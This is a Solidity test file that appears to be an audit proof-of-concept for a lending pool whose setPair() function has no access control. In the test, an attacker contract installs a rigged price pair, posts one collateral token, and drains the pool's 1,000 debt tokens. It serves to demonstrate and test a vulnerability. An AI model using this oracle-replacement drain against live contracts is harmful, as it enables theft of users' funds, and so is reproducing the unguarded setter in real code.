// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/LendingPool.sol";
import "../src/SimplePair.sol";
import "../src/IERC20.sol";
import "./Helpers.sol";

contract Attacker {
    function approve(MockERC20 t, address s, uint256 a) external { t.approve(s, a); }
    function deposit(LendingPool p, uint256 a) external { p.depositCollateral(a); }
    function borrow(LendingPool p, uint256 a) external { p.borrow(a); }
    function setPair(LendingPool p, SimplePair np) external { p.setPair(np); }
}

contract LendingPoolSetPairTest {
    // Issue 3: setPair() has no access control. A non-owner installs a pair it
    // controls (reporting an absurd collateral price) and drains the pool's debt tokens.
    function test_nonOwnerSetsPairAndDrains() external {
        MockERC20 token0 = new MockERC20("COL");
        MockERC20 token1 = new MockERC20("DEBT");

        // Honest pair with a fair 1:1 price.
        SimplePair honest = new SimplePair(token0, token1);
        token0.mint(address(honest), 100e18);
        token1.mint(address(honest), 100e18);
        honest.sync();

        // Pool deployed by THIS contract => owner == this contract, not the attacker.
        LendingPool pool = new LendingPool(token0, token1, honest);
        token1.mint(address(pool), 1_000e18); // pool liquidity to be stolen

        Attacker attacker = new Attacker();
        require(pool.owner() != address(attacker), "attacker must not be owner");

        // Attacker builds a malicious pair reporting a huge collateral price.
        // reserves 1 : 1e24 => price = 1e24 * 1e18 / 1 == 1e42.
        SimplePair evil = new SimplePair(token0, token1);
        token0.mint(address(evil), 1);
        token1.mint(address(evil), 1e24);
        evil.sync();

        // No access control: the non-owner swaps in its own oracle.
        attacker.setPair(pool, evil);
        require(address(pool.pair()) == address(evil), "pair not replaced");

        // Deposit a token of collateral; at the fake price it is "worth" an enormous amount.
        token0.mint(address(attacker), 1e18);
        attacker.approve(token0, address(pool), 1e18);
        attacker.deposit(pool, 1e18);

        // Borrow the pool's ENTIRE debt-token balance.
        uint256 poolBal = token1.balanceOf(address(pool));
        require(poolBal == 1_000e18, "pool funded");
        attacker.borrow(pool, poolBal);

        // IMPACT: attacker holds all 1000 debt tokens backed by 1 token of real collateral.
        require(token1.balanceOf(address(attacker)) == 1_000e18, "attacker did not drain");
        require(token1.balanceOf(address(pool)) == 0, "pool not drained");
        require(pool.collateralOf(address(attacker)) == 1e18, "collateral posted");
        // Net theft = 1000 debt tokens for 1 collateral token.
    }
}
